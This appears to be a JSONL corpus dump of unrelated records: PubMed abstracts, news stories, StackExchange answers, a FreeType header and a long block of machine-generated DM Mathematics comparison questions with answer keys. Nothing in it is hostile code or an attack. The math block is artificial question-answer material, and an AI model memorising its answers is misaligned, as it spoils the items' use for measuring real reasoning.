{"text": "Molecular systematics and biogeography of Nicrophorus in part--the investigator species group (Coleoptera: Silphidae) using mixture model MCMC.\nBurying beetles (Silphidae: Nicrophorus) are well-known for their biparental care and monopolization of small vertebrate carcasses in subterranean crypts. They have been the focus of intense behavioral ecological research since the 1980s yet no thorough phylogenetic estimate for the group exists. The relationships among the species, and the validity of some species, are poorly understood. Here, we infer the relationships and examine species boundaries among 50 individuals representing 15 species, primarily of the investigator species group, using a mixture-model Bayesian analysis. Two mitochondrial genes, COI and COII, were used, providing 2129 aligned nucleotides (567 parsimony-informative). The Akaike Information Criterion and Bayes Factors were used to select the best fitting model, in addition to Reversible Jump MCMC, which accommodated model uncertainty. A 21 parameter, three-partition GTR+G was the final model chosen. Despite a presumed Old World origin for the genus itself, the basal lineages and immediate outgroups of the investigator species group are New World species. Bayesian methods reconstruct the common ancestor of the investigator species group as New World and imply one later transition to the Old World with two return transitions to the New World. Prior hypotheses concerning the questionable validity of four species names, Nicrophorus praedator, Nicrophorus confusus, Nicrophorus encaustus and Nicrophorus mexicanus were tested. No evidence was found for the validity of the Nicrophorus investigator synonym N. praedator. We found evidence rejecting the species status of N. confusus (NEW SYNONYM of Nicrophorus sepultor). Weak evidence was found for the species status of N. encaustus and N. mexicanus, which are tentatively retained as valid. Our results strongly reject a recently published hypothesis that Nicrophorus interruptus (NEW STATUS as valid species) is a subspecies of N. investigator.", "meta": {"pile_set_name": "PubMed Abstracts"}}
{"text": "21.3. Let r = -4.2 - y. Which is the second smallest value?  (a) r  (b) 17  (c) -5\na\nLet x = -0.1 + 0.3. What is the second smallest value in 0.7, x, -0.8?\nx\nLet a(c) = c**2 + 6*c + 3. Let x be a(-5). Let w be x/(34/10 - 3). What is the second biggest value in w, -0.4, -8?\nw\nLet c = -346.1 + 367. Let f = -21 + c. Let p = -15/7 + 53/28. What is the third biggest value in f, p, 1/2?\np\nLet d = -2.5 - -2. Let l = -239/3 + 80. Let k = -15 + 18. What is the second smallest value in k, l, d?\nl\nLet j = 147/355 + -1/71. Which is the smallest value?  (a) -2  (b) -2/5  (c) -28  (d) j\nc\nLet v = 4.762 + -4.7. Let y = v + -0.092. What is the biggest value in -0.5, 1/6, y?\n1/6\nSuppose 0 = -2*j + 2*w - 14, -3 + 18 = -3*j + w. Let m be 4/20 - 28/(-60). What is the third smallest value in 5, m, j?\n5\nLet b = 2/7 + 8/21. Let a = 2/273 + 1361/546. What is the second biggest value in b, a, 2, -4?\n2\nLet s = 10.4 + -10. Let v = 3.6 + s. Let z = v + -4.04. What is the second smallest value in 0.3, 0, z?\n0\nLet r = -8 + 8. Let z = 13 + -56. Let f = z + 44. What is the second biggest value in 0.1, f, r?\n0.1\nLet v = -0.0355 + 3.0355. Let h = 13 - 23. Let f = h + 5. Which is the biggest value?  (a) 3/5  (b) f  (c) v\nc\nLet h = 82 + -118. Let u = h - -32. What is the biggest value in u, -3/7, 0.3?\n0.3\nLet v = -0.291 - -0.25. Let d = 0.159 - v. Let x = -2 - -2. What is the biggest value in x, -15, d?\nd\nLet k = 1079 + -1081. Let t = -0.8 + 0.5. Let j = 2/13 - -35/26. Which is the biggest value?  (a) k  (b) j  (c) t\nb\nLet h = -0.11 + -6.89. Let x = 34 - 368/11. Let s = -365/2288 + 1/176. What is the second smallest value in s, h, x?\ns\nLet g = -18 - -20. Let r = -1.98 - 0.02. Let y = -2.3 - r. Which is the third biggest value?  (a) y  (b) g  (c) 2/7\na\nLet w = 5.33 + -5. Let t = -4.33 + w. What is the third biggest value in -2/5, t, -1/3?\nt\nLet s = 291.92 - 292. Which is the third biggest value?  (a) 2  (b) s  (c) -1\nc\nLet k = 2.48 - 1.48. Let x = -1 - -0.95. Which is the biggest value?  (a) x  (b) 2/11  (c) k\nc\nLet j = -3.534 - 0.466. What is the biggest value in 2/13, 3, 5, j?\n5\nLet o = 530 + -506. Which is the biggest value?  (a) 1  (b) o  (c) -1/2\nb\nLet j = 990 + -10878/11. Let i = 277/1287 + 1/143. Which is the second biggest value?  (a) 5  (b) j  (c) i\nb\nLet x = 2355 - 2354.942. Let h = 0.3 - -0.2. Which is the third biggest value?  (a) h  (b) x  (c) -1\nc\nLet y(v) = v**2 - 4*v - 9. Let n be y(6). Let u = -0.3 - 0.1. Let s be (1 + -5)/(-12)*-1. Which is the smallest value?  (a) s  (b) n  (c) u\nc\nLet n be (-2)/(-34) + (-936)/306. Let h = 5.5 + -5. Which is the third biggest value?  (a) -2/9  (b) n  (c) h\nb\nLet i = -0.1 - -0.2. Let b be (1 + (-10)/4)*-2. Let h be b + (64/(-10) - -3). What is the smallest value in i, -5, h?\n-5\nLet f = -971 - -970.6. Which is the second smallest value?  (a) f  (b) -50  (c) -0.1  (d) -5\nd\nLet r be (10/(-1000)*-30)/(3/5). Let t = -577/88 - -51/8. Let c = 2 + -4. What is the second smallest value in t, c, r?\nt\nLet c = -0.029 + 0.029. What is the fourth smallest value in 0.4, 6, -3, c?\n6\nLet m = -429.8 + 430. What is the biggest value in -2/13, -2/79, -3, m?\nm\nLet k = -15.13 - -15.23. What is the second smallest value in 57, k, 5/3?\n5/3\nLet o = -61.5 + 59. Let v = o + 5.5. Which is the biggest value?  (a) -0.3  (b) v  (c) -1/3  (d) -5\nb\nLet j = -52/19 - -516/133. Let c = -148140/17 + 8714. What is the biggest value in c, j, 4/7, -0.1?\nj\nLet f be (2/(-3))/((-1)/(-3)). Let g = 35.3 - 40.3. Which is the third smallest value?  (a) f  (b) 0.1  (c) g\nb\nLet n = -998 + 1002. What is the smallest value in 6, n, 0?\n0\nSuppose -4*o = x - 0*x + 1, 0 = 5*o + 2*x - 1. Which is the third biggest value?  (a) o  (b) -2/5  (c) 0.7  (d) -2\na\nLet l(j) = -j**3 + 19*j**2 + 13*j - 17. Let q be l(19). Suppose 8*k = 70 - q. Which is the biggest value?  (a) -4/9  (b) k  (c) -1\na\nLet o = -89/603 - 5/67. Let t = 5 - 10. Let p = 9 + t. What is the second biggest value in 5, p, o?\np\nSuppose 4*s + 5*j - 9 = -0*s, -5*j + 21 = s. Let h = 4.511 + -0.511. Which is the third biggest value?  (a) h  (b) 0  (c) s  (d) 1.5\nb\nLet j = 63.41 + -0.41. Let m = j + -59. Which is the second biggest value?  (a) m  (b) -0.2  (c) -4  (d) -0.4\nb\nLet u = -133 + 129. Suppose 3*v + 5 = f, -5*f + 0*f = -2*v + 1. Let h be 4/18 - v/(-6). Which is the smallest value?  (a) u  (b) h  (c) -2/13\na\nLet j = 14 - 13.1. Let o = 4.9 - j. Which is the smallest value?  (a) 0.2  (b) o  (c) -1/5\nc\nLet k = 86 + -86. Which is the third smallest value?  (a) -20  (b) k  (c) -1/7\nb\nLet u = 0.49 - -4.66. Let t = -0.15 + u. What is the third biggest value in 2, t, -1?\n-1\nSuppose 4*d + 8*i - 3*i = 143, 0 = -5*d - 4*i + 172. Let w = 129/4 - d. What is the second biggest value in 2, 5/4, w?\n5/4\nLet g(t) = -4*t**2. Let m be g(-1). What is the biggest value in m, 0.3, 1, 0.037?\n1\nLet z = 18 + -2. Suppose -2*s = -5*x + 20, 3*s - z + 4 = -3*x. What is the third smallest value in 4, 3, s, 8?\n4\nLet n = 0.75 + -0.88. Let v = 11.27 - 11. Let i = n - v. What is the second smallest value in 1/2, 0.2, i?\n0.2\nSuppose 0*p = -2*p - 10, 0 = 4*j + p + 1. Let r(o) = -4*o**2 + 28*o - 1. Let l be r(7). What is the third smallest value in 0, j, l?\nj\nSuppose -4*y + 99 = 2*l + 31, 0 = 4*y - 5*l - 54. Let r be (1/5)/(8/y). Which is the second smallest value?  (a) 0.1  (b) -4  (c) r\na\nLet p = -8 - -5. Let b = p + 2.8. Let w(s) = s**3 + 6*s**2 + 6*s + 4. Let t be w(-5). What is the third biggest value in t, 3, b?\nt\nLet l = 28.5 + -28. Let m = -0.02 - -1.02. What is the third smallest value in 0.1, l, m, -0.5?\nl\nLet d = -0.5 - 0.03. Let j = -0.13 + 0.1. Let y = d - j. What is the second smallest value in y, 0, 4?\n0\nLet m = -13/24 - -7/72. What is the second biggest value in 0.4, m, 0.11, -0.5?\n0.11\nLet q = -0.0194 + -0.9806. Which is the smallest value?  (a) -0.3  (b) q  (c) -69\nc\nSuppose -3*l + 2 = -7. Let w = 524 - 529. What is the biggest value in w, -1, l?\nl\nLet l = -1467 + 1468. What is the third smallest value in -0.4, l, -4/3, -20?\n-0.4\nLet t = 693 - 693.3. Which is the third biggest value?  (a) 1  (b) 4  (c) t\nc\nLet j = 2.97 - 1.97. Which is the third biggest value?  (a) 0.3  (b) j  (c) -3\nc\nLet x = 205 - -110. Let b be (-110)/x - 2/9. What is the third smallest value in b, 0.07, 4?\n4\nLet i = -67 + 72. Let x = 0.028 - 0.328. Which is the fourth biggest value?  (a) i  (b) -1  (c) -0.1  (d) x\nb\nLet n = 19.5 - 23.5. What is the smallest value in -0.4, n, -0.7, 0?\nn\nLet u be (4/(-22) + 50/33)/(-6). Let x be 2/5*30/21. What is the biggest value in u, 0, x?\nx\nLet r = 0.962 - 1.362. Which is the second biggest value?  (a) 464  (b) 0.5  (c) r\nb\nLet l be -1*(0 - (-2)/22). Let y be -5*1/(-3) - 2. Which is the fourth smallest value?  (a) y  (b) -3  (c) 1/2  (d) l\nc\nLet a = -32 - -87. Let l = 54 - a. What is the biggest value in 0.05, l, -2/9, 0?\n0.05\nSuppose 3*q + 15 = 0, -o + 7*q - 6*q + 2 = 0. Let r = 0.067 + 0.133. What is the second biggest value in 4, o, -1, r?\nr\nLet u = -3.41 + 1.41. Which is the second biggest value?  (a) -1/4  (b) -3  (c) -2/9  (d) u\na\nLet t(n) = -93*n + 1. Let r be t(-1). Let y = r + -64. Suppose 0 = 5*w - 5 + y. Which is the second biggest value?  (a) -2/5  (b) w  (c) 0\na\nLet u = 81.9 + -82. Which is the smallest value?  (a) 1/4  (b) u  (c) 3/4\nb\nLet o = 5.7 + -4.74. Let k = o + -1. Let m be (-200)/180 + 4/(-18). What is the third biggest value in m, k, -2?\n-2\nLet q = 31.6 + -51. Let s = q + -4.6. Let p = s + 24.03. Which is the second biggest value?  (a) 0  (b) p  (c) -0.2\na\nSuppose -1 = 5*w + 262*k - 261*k, -8 = 4*w - k. Which is the biggest value?  (a) -2/5  (b) w  (c) -248\na\nLet g = 31118 - 155083/5. Let i = g - 101. What is the second smallest value in 1, i, 1/2?\n1/2\nLet h be 2/(-4) - (-55)/22. What is the third biggest value in -8, h, -2?\n-8\nLet o = 17 + -11. Suppose -o - 2 = -4*j. Suppose -6*w - 20 = -j*w + 2*d, 3*w - 4*d + 4 = 0. What is the third biggest value in -1/5, -2/7, w?\nw\nLet m be (-854)/1656 + 4/18. Let u = m - -1/23. Let g = 172 + -177. What is the smallest value in u, 0, g?\ng\nLet m be 5 + -1 - (-4)/((-8)/10). What is the third biggest value in 0.1, m, -0.2, -9/10?\n-9/10\nLet n = 8594 - 171917/20. Let s = n + 8/5. Suppose -2*r - c + 6 = 0, -2 = -6*r + 3*r - 5*c. What is the second smallest value in r, -2/3, s", "meta": {"pile_set_name": "DM Mathematics"}}
{"text": "On Sept. 12, Vladimir Putin quietly passed a landmark date: He had spent 6,602 days as the top leader of Russia.\n\nThough not widely acknowledged, this figure meant that Putin had spent more time in office than Soviet leader Leonid Brezhnev, who ruled for 18 years and one month between 1964 and 1982 (6,601 days).\n\nIt also means that Putin is now the longest-serving Russian leader since Joseph Stalin, who led the Soviet Union for almost three decades between 1924 and 1953 - 10,636 days in total.\n\nThis may not be the sort of record the Kremlin is keen to publicize. Though the Soviet era is often remembered fondly in Russia, Stalin and Brezhnev were clearly not democratic leaders. Putin is - at least in theory.\n\nThat makes his lengthy time in office more unusual. During his time leading Russia, Putin has dealt with four separate U.S. presidents as well as four British prime ministers and two German chancellors.\n\nThe Kremlin may also dispute the methodology, as Putin wasn't president for all of his time in office. He first became prime minister of Russia on Aug. 16, 1999, before entering the presidential office May 7 the next year. Later, as the Russian Constitution limits the president to two consecutive terms, Putin stepped out of the Kremlin in 2008 while his prime minister, Dmitry Medvedev, became president.\n\nHowever, most analysts agree that Putin still held the real power during that \"tandem\" presidency. He returned to the presidency in 2012.\n\nPutin's increasingly lengthy time in office may not appear to be a problem to many Russians - as widely noted, his approval ratings remain extraordinarily high. He is widely expected to stand to be nominated as a presidential candidate again for next year's elections, according to reports in the Russian media.\n\nBut there are some signs of a malaise setting in; some Russians have begun to share cynical jokes about Putin that resemble those told during the Brezhnev era. Turnout in recent local elections was low, and some polls suggest that a significant minority of the country is not sure whether they want Putin to run for reelection.\n\nStill, Putin is likely to win next year's election if he runs - potentially putting him in office until 2024 (after Medvedev left office, presidential terms were increased from four to six years). He could choose to keep going after that, too - both Brezhnev and Stalin died in office, and at 64, Putin is thought to be in good health. At this point, it's hard to imagine who could succeed him or how.\n\n(This story has not been edited by NDTV staff and is auto-generated from a syndicated feed.)", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Q:\n\nHow to modify the HTML tag in Joomla 1.5?\n\nI need to define an appcache manifest on the login page.  I found the same question asked about Drupal 6, but the file mentioned, page.tpl.php, does not exist.  Where is the counterpart in Joomla?\n\nA:\n\nThe HTML tag should be in the template index.php found here -\nJOOMLA INSTALL/templates/YOUR TEMPLATE/index.php\n\n", "meta": {"pile_set_name": "StackExchange"}}
{"text": "Electron spin resonance and high pressure liquid chromatographic analysis of melanin in posterior choroidal melanomas.\nElectron spin resonance (ESR) and high pressure liquid chromatography (HPLC) were utilized to characterize the physical and biochemical characteristics of melanin in choroidal melanoma. ESR free radical signals indicative of eumelanin could be elicited from formalin-fixed paraffin-embedded tissues. Zinc ions (50 mM) increased the number of melanin-free radicals resulting in greater ESR sensitivity. Pyrole 2,3,6 tricarboxylic acid (PTCA) and amino hydroxy phenylalanine (AHP) were identified by HPLC after permanganate oxidation and hydroiodic acid hydrolysis, respectively, of a choroidal melanoma obtained at enucleation. The results indicate eumelanin is the primary melanin type in posterior choroidal melanomas. The feasibility of these techniques in the detection of metastatic disease from ocular melanomas is discussed.", "meta": {"pile_set_name": "PubMed Abstracts"}}
{"text": "Q:\n\nWheelchair on a 15% slope\n\nI'm about to take my friend on a trip. This friend is in a wheelchair. It's mostly flat pavement with one exception. There is 15% slope I will need to climb up and down. It's something like 300 meters but it seems quite steep.\nIs it reasonable to think this will be no problem at all? The wheelchair has brakes and is pretty light. The person does not have more than 65 kg. I would say I'm in good fitness form. The surface is asphalt.\nThanks,\nEndokr\n\nA:\n\nThe ADA specs in the USA call for a maximum grade of 1:12 (8.3%) for ramps. But many disabled people who don\u2019t have upper body strength find even this is too steep. So 15% for sure is too steep for most people to do by themselves. Your friend may be a wheelchair triathlete, it\u2019s hard for us to know. \nFurthermore, the ADA also calls for landings every few yards. These are necessary rest areas with a zero grade. They are especially important if the wheelchair brakes won\u2019t hold on a steep grade because otherwise you might have a runaway chair. \nIt sounds like you\u2019re pushing. 15% is quite steep and 300 meters is quite a long run. Try to consider what will happen if you lose your grip or fall while pushing your friend up or down. Do they have enough strength and control to bring themselves to a full stop on such a grade? I\u2019d first practice with someone who is able bodied and able to leap out of the chair if it goes out of control. \nMany tourism councils can refer you to a local power wheelchair or scooter rental office. Or can suggest an alternative route or hook you up with local paratransit options such as an accessible taxi service. \n\n", "meta": {"pile_set_name": "StackExchange"}}
{"text": "Molecular imprinting: developments and applications in the analytical chemistry field.\nIn analytical separation science, molecularly imprinted polymers have been applied in several analytical techniques, such as liquid chromatography, capillary electrochromatography and capillary electrophoresis, solid phase extraction, immunoassay, and as a selective sorbent in chemical sensors. A benefit of imprinted polymers is the possibility to prepare sorbents with selectivity pre-determined for a particular substance, or group of structural analogues. The application most close to a wider acceptance is probably that of solid phase extraction for clean-up of environmental and biological samples. The improved selectivity of imprinted polymers compared with conventional sorbents may lead to cleaner chromatographic traces in the subsequent analytical separation. Furthermore, the solid phase extraction application does not suffer from drawbacks generally associated with imprinted polymers in chromatography, such as peak broadening and tailing. Most liquid chromatographic studies have focused on using imprinted polymers as chiral stationary phases for enantiomer separations. Also, the use of imprinted polymers as selective sorbents in capillary electrochromatography has been presented. For this purpose, a protocol to prepare superporous, monolithic imprinted polymer-based capillary columns has been developed. Due to the high affinities and selectivities often achievable, imprinted polymers have been considered as alternative binding entities in biosensors and in immunoassay type protocols. Here, high stability, easy preparation and ability to be used for assay of both aqueous and organic solvent based samples are advantages of the polymers.", "meta": {"pile_set_name": "PubMed Abstracts"}}
{"text": "Hundreds of soul music enthusiasts from the United Kingdom plan to make their way to Detroit this month for a series of concerts.\n\nDetroit A-Go-Go, a festival organized by DJ Phil Dick, will take place Oct. 19-22 with 26 scheduled acts.\n\nThe festival is focused on what Dick calls the northern soul movement.\n\n\"We just love Detroit soul and Motown music,\" Dick said. \"It's been popular in England for decades. Every weekend, thousands of people go out and listen to this music in England.\"\n\nArtists booked for the festival include: The Elgins, Pat Lewis, Melvin Davis, The Velvelettes, The Contours, Kim Weston, Ronnie McNeir, The Capitols, Yvonne Vernee, JJ Barnes, Gino Washington, Spyder Turner, The Adorables, Lorraine Chandler, Eddie Parker, Dusty Wilson, The Precisions, The Professionals, The Tomangoes, The Fabulous Peps and The Dynamics, according to their website.\n\nThe Hotel St. Regis is completely booked for 300 people traveling from the U.K., and shows will take place at Bert's Warehouse Theatre in Eastern Market and Motown Museum.\n\nAlthough many of the artists are known for their connections to Detroit, Dick said \"they're iconic to us in England.\"\n\nIt will be the first Detroit A-Go-Go event. Dick said he's organizing it to show his fellow Brits what Detroit is all about.\n\n\"I know it's had its problems, but I love Detroit and I love Detroit people... I want to see these artists perform in their hometown,\" he said. \"There's so many talented artists that a lot of people just pass it by and don't even know what they got.\"\n\nTickets, which can be purchased at Bert's Warehouse or online, cost $28 per night or $98 for a full event pass. Each night will consist of five to six live acts plus DJs.\n\nLocal and international DJs will be spinning records at Hotel St. Regis throughout the day.\n\nView the schedule here.", "meta": {"pile_set_name": "OpenWebText2"}}
{"text": "\n\nThe Gossip Machine, Churning Out Cash - chrishenn\nhttp://www.nytimes.com/2011/05/22/us/22gossip.html\n\n======\nchrishenn\nIt seems that there's a much bigger market for it now that content can be put\nonline quickly, at a much cheaper cost.\n\n _Posting more than 30 exclusive items a day is common. \u201cWe\u2019re trying to build\nwhat they call addicts online,\u201d Mr. Perel said_\n\nThe model thrives off super low quality content, yet the websites are able to\ngain diehard readers. Even some of my favorite websites and blogs are useless\nto me without their rss feed.\n\n", "meta": {"pile_set_name": "HackerNews"}}
{"text": "Q:\n\nSplitting entities vs. using transactions\n\nI have an entity with two types of properties:\n\nProperties that are updated by the user from a web page.\nProperties that are updated when a third-party service makes an API call to my app.\n\nIf my entity only had properties of the first type, I wouldn't use transactions to do updates because only a single user would ever be modifying the data.\nBecause a third-party service will be making calls that will also by updating the entity, there is now a risk of losing data if the user is making an edit at the same time as the API call.\nIt seems that to avoid data loss, I could do one of two things:\n\nUse transactions for all puts of this entity (they happen in a lot of different places so it would be a fair bit of work), or\nSplit the entity in two where a first entity has properties of the first type that are updated without transactions and a second entity that has properties of the second type (that may be updated with transactions).\n\nI'm having trouble deciding which is the better option, and would appreciate advice.\n\nA:\n\nEven with entities split avoiding transactions for the web-interface modified entities might not be as clear/easy as you might expect:\n\nthe user may attempt to modify the same entity from different sessions/windows/devices\nthe info displayed to the user right after it was modified might not be the one actually existing in the datastore due to eventual consistency\n\nIn other words it might be safer (and potentially easier, futureproof) to have transactions on the user web interface as well.\nBut even if do that, it might still make sense to split the entitites if it makes sense for your app, it's a common technique, see:\n\nupdating an entity's property without retrieving the entity from the NDB\nGoogle App Engine Datastore entities. Efficiency and structure\nre-using an entity's ID for other entities of different kinds - sane idea?\n\n", "meta": {"pile_set_name": "StackExchange"}}
{"text": "Q:\n\nDoes solitary open() leave the file handle open?\n\nWill a single call to open() without assigning it to a variable close the file handle after it is done executing?\nimport json\n_keyfile = json.load(open(\"s3_key.json\", \"r\"))\n\nWhat about if you call .read() on it?\nimport json\n_keyfile = json.loads(open(\"s3_key.json\", \"r\").read())\n\nA:\n\nAs per the python docs, the file remains open until you call close() on the file object or the garbage collector kicks in and closes it for you.\nBecause of this, prefer to use context managers (i.e. the with statement) when reading files, as they will close the file for you.\nimport json\nwith open(\"s3_key.json\", \"r\") as f:\n    _keyfile = json.load(f)\n# f is now closed\n\n", "meta": {"pile_set_name": "StackExchange"}}
{"text": "Follow UsFind us on social media\n\nThe Rock Works\n\nChoose a rock colour\n\nThe Pantone Matching System (PMS) is a uniform standard for colors. The swatches below will help you find a certain PMS colour for your rock. Please note that every computer monitor varies slightly in color. To insure an accurate colour match, you can consult a PMS solid coated swatch book.\n\nChoose a stripe colour\n\nThe Pantone Matching System (PMS) is a uniform standard for colors. The swatches below will help you find a certain PMS colour for your rock. Please note that every computer monitor varies slightly in color. To insure an accurate colour match, you can consult a PMS solid coated swatch book.", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Q:\n\nEntity Framework - How can I check whether an object is under another object's Hierarchy?\n\nI have an table called Contents. There's one to many relationship on Contents, so each content can have a parent and children. I'm using EF Code First, so I have an entity Content which has Id, ParentId, Parent and Children properties.\nNow, I'm building an ajax based tree of Contents. I have a simple action that returns a JSON of one level of Contents, based on parentId:\npublic JsonResult GetContents(int? parentId = null)\n{\n    return Json(db.Contents\n        .Where(p => p.ParentId == parentId)\n        .Select(p => new\n        {\n            id = p.Id,\n            name = p.Name\n        });\n}\n\nThe next thing I want to do is to automatically select some value. The problem is that the value can be deep inside the hierarchy of the tree, so for each content I'll need to know whether or not the selected value is a child or grandchild and so forth, of it.\npublic JsonResult GetContents(int? parentId = null, int selectedValue)\n{\n    return Json(db.Contents\n        .Where(p => p.ParentId == parentId)\n        .Select(p => new\n        {\n            id = p.Id,\n            name = p.Name\n            isSelectedValueUnderThisHierarchy: // How can I efficiently implement this? \n        });\n}\n\nIt's easy to implement with a lot of queries, but I'm trying to make things as efficient as possible, and EF doesn't provide any Recursive methods as far as I know, so I really have no clue where to start.\n\nA:\n\nYou could first build a list of all the ParentIds from the selected value.  Depending on the size of your Contents table, you could first load the data, then loop through without making extra queries to the database.\ndb.Contents.Load();\nvar selectedItem = db.Contents.Find(selectedValue);\n\nvar parents = new List<int>();\nwhile (selectedItem.ParentId != null)\n{\n    parents.Add(selectedItem.ParentId.Value);\n    selectedItem = selectedItem.Parent;\n}    \n\nAlternatively, you could use CTE (Common Table Expression).\nvar parents = db.Database.SqlQuery<int>(\"sql statement\");\n\nOnce you have a list of parents, you can use Contains.\nreturn Json(db.Contents\n    .Where(p => p.ParentId == parentId)\n    .Select(p => new\n    {\n        id = p.Id,\n        name = p.Name\n        isSelectedValueUnderThisHierarchy = p.ParentId.HasValue && parents.Contains(p.ParentId.Value)\n    });\n\nUPDATE: CTE Example\nYou'd probably want to use a stored procedure, but this code should work.\nvar sql = @\"with CTE as\n    (\n        select ParentId\n        from Contents\n        where Id = {0}\n        union all\n        select Contents.ParentId\n        from Contents\n            inner join CTE on Contents.Id = CTE.ParentId    \n    )\n\n    select *\n    from CTE\n    where ParentId is not null\";\nvar parents = db.Database.SqlQuery<int>(string.Format(sql, selectedItem)).ToList();\n\n", "meta": {"pile_set_name": "StackExchange"}}
{"text": "Now that\u2019s a punishment: club vice president sent to train with the reserves!\n\nFor almost an entire year, Gabriel Bostina has been playing a double role for Universitatea Cluj. Unfortunately for him, the position acquired in the club\u2019s board didn\u2019t earn him any favors from the technical staff, who recently punished the central midfielder. Twice. First of all, Bostina lost the armband during one of the training camps from Antalya for some unknown disciplinary problems and now the player & vice president has suffered further embarrassment being sent to train with the reservers \u201cfor an unlimited period\u201d.\n\nCurrently injured, he failed to show up for the weekend training sessions that were going to be supervised by the club\u2019s medical staff, so the former Otelul, Steaua and Dinamo man is now part of a team that plays in the Romanian third tier. The decision belongs to Ionut Badea, the coach, and the club owner is yet to take a stand. Wouldn\u2019t make sense to see the vice president banned as well from the board meetings and ask to babysit the other members\u2019 kids while the grown-ups discuss professionally about the club\u2019s present and future?\n\nRadu Baicu\n\n\u2022 15 years of continuous work in scouting, for top clubs and companies;\n\u2022 Worked for clubs like Bayer 04 Leverkusen and Hannover 96, covering the Romanian market;\n\u2022 Worked for Birmingham based company \u2018The Scouting Network\u2019 (www.tsn.co.uk) as a football scout;\n\u2022 Worked for Zurich based company Boutique Football as a scouting network coordinator;\n\u2022 International scout for Young Boys Bern for 2 years, covering Eastern European football.\n\u2022 Working for the past 5 years as an international scout for a top French club.", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Rarely does a story involving Immigration and Customs Enforcement, explosives, and a man trying to escape his own sense of inadequacy through law enforcement cosplay end in anything but tragedy for innocent parties, so please allow me to relay to you an incredible tale about how one sad man\u2019s fantasy\u2014guns, improvised explosives, and a desire to align himself with a racist agency\u2014spun out of control and landed him in jail.\n\nAdvertisement\n\nThe Sacramento Beereports that, for months!, 26-year-old Matthew Johnston posed as an ICE agent to impress his girlfriend, parents, daughter, and friends. Now, however, he will be spending the next two years in federal prison after he pled guilty to possessing an unregistered explosive. Poor guy.\n\nJohnston was so committed to the role, the Sacramento Bee reports, that he had ICE badges, uniforms, and red and blue police lights:\n\nNearly all the trappings of Johnston\u2019s life in Fontana, California, suggested he had a job with the federal law enforcement agency, according to court records: He wore ICE badges and uniforms. He used blue and red police lights on his car. He had a tactical vest that said \u201cfederal agent.\u201d Johnston described his job on Facebook as \u201cfugitive apprehension\u201d for the Department of Homeland Security, which includes ICE.\n\nAdvertisement\n\nHe lived the life well:\n\nHe once flashed his fake police lights to pursue another car, which caused a collision, prosecutors said. On another occasion, he posed as an ICE agent to speak with someone about a possible undocumented person. Johnston also bragged that he was an ICE agent to patrons and workers at D\u00e9j\u00e0 Vu Showgirls, a strip club in Industry, California, prosecutors said.\n\nMysteryVibe\u2019s Crescendo Is An INSANELY Versatile Vibrator for Literally...\n\nBut Johnston\u2019s lie came undone last October, after a cop pulled his girlfriend over at a traffic stop after she accidentally turned on the fake police lights in her boyfriend\u2019s Audi. The officer followed up with ICE to verify the woman\u2019s claim that Johnston was an agent with the Department of Homeland Security, but found no such record.\n\nFrom there, things got worse for our man Johnston. About a week later, real federal agents showed up at his home with a search warrant \u201cand uncovered 32 firearms, about 10,000 rounds of ammunition, cannon fuses, homemade rocket launchers, homemade rockets and other destructive devices.\u201d\n\nAdvertisement\n\nThere\u2019s more! According to prosecutors, officials also found \u201ca host of homemade explosives \u2014 including five unexploded or semi-exploded improvised devices, what was left of an exploded pipe bomb and an expended smoke grenade\u201d in a stockpile Johnston hid in the desert.\n\nLike every story about male inadequacy, Johnston tried to justify his illicit actions and criminal behavior by saying that a woman once embarrassed him:\n\nWhen officers spoke to Johnston that day, he said he pretended to be an ICE agent \u201cbecause his ex-wife had insulted him in front of his daughter and told his daughter that he had done nothing with his life.\u201d He decided to concoct the ICE story \u201cto show everyone that he was \u2018somebody\u2019 and had done something with his life,\u201d he said, according to court records.\n\nAdvertisement\n\nNow poor Matthew Johnston will never realize his full fantasy, which apparently included the ability to racially profile people of color without impunity and help tear apart families. Bye! Read the full, incredible report here.", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "/***************************************************************************/\r\n/*                                                                         */\r\n/*  svpostnm.h                                                             */\r\n/*                                                                         */\r\n/*    The FreeType PostScript name services (specification).               */\r\n/*                                                                         */\r\n/*  Copyright 2003, 2007 by                                                */\r\n/*  David Turner, Robert Wilhelm, and Werner Lemberg.                      */\r\n/*                                                                         */\r\n/*  This file is part of the FreeType project, and may only be used,       */\r\n/*  modified, and distributed under the terms of the FreeType project      */\r\n/*  license, LICENSE.TXT.  By continuing to use, modify, or distribute     */\r\n/*  this file you indicate that you have read the license and              */\r\n/*  understand and accept it fully.                                        */\r\n/*                                                                         */\r\n/***************************************************************************/\r\n\r\n\r\n#ifndef __SVPOSTNM_H__\r\n#define __SVPOSTNM_H__\r\n\r\n#include FT_INTERNAL_SERVICE_H\r\n\r\n\r\nFT_BEGIN_HEADER\r\n\r\n  /*\r\n   *  A trivial service used to retrieve the PostScript name of a given\r\n   *  font when available.  The `get_name' field should never be NULL.\r\n   *\r\n   *  The corresponding function can return NULL to indicate that the\r\n   *  PostScript name is not available.\r\n   *\r\n   *  The name is owned by the face and will be destroyed with it.\r\n   */\r\n\r\n#define FT_SERVICE_ID_POSTSCRIPT_FONT_NAME  \"postscript-font-name\"\r\n\r\n\r\n  typedef const char*\r\n  (*FT_PsName_GetFunc)( FT_Face  face );\r\n\r\n\r\n  FT_DEFINE_SERVICE( PsFontName )\r\n  {\r\n    FT_PsName_GetFunc  get_ps_font_name;\r\n  };\r\n\r\n  /* */\r\n\r\n\r\nFT_END_HEADER\r\n\r\n\r\n#endif /* __SVPOSTNM_H__ */\r\n\r\n\r\n/* END */\r\n", "meta": {"pile_set_name": "Github"}}
{"text": "Expanding indications for deep brain stimulation.\nIt has been three decades since the first application of deep brain stimulation (DBS) for tremors was described by Benabid. Over the years, the indications for the performance of DBS have been expanding. There are now more than 1,50,000 patients around the world who have undergone DBS for various disorders. The main appeal of DBS is in its reversibility and titratability. Though the initial interest in DBS was for pain, the main indications for DBS have been movement disorders. Despite its wide appeal and \"perceived\" advantage, United States Food and Drug Administration, the nodal agency for approving therapies, has been cautious and guarded in providing approvals. Only two indications, i.e., Parkinson's disease and tremors, have been approved; the two other indications, i.e., dystonia and obsessive compulsive disorder (OCD), have been granted exemption under the humanitarian device usage. However, the European community has been more liberal and several of these indications have CE (Conformite Europeene) approval. Most of them will be reviewed in this article. There have been numerous indications for which DBS has been applied, which in turn has helped to change the lives of several patients. Unfortunately, due to the paucity of the number of procedures performed and the inherent difficulty in conducting \"surgical\" double blind randomized trials, Class 1 or Class 2 evidence for several of these indications is 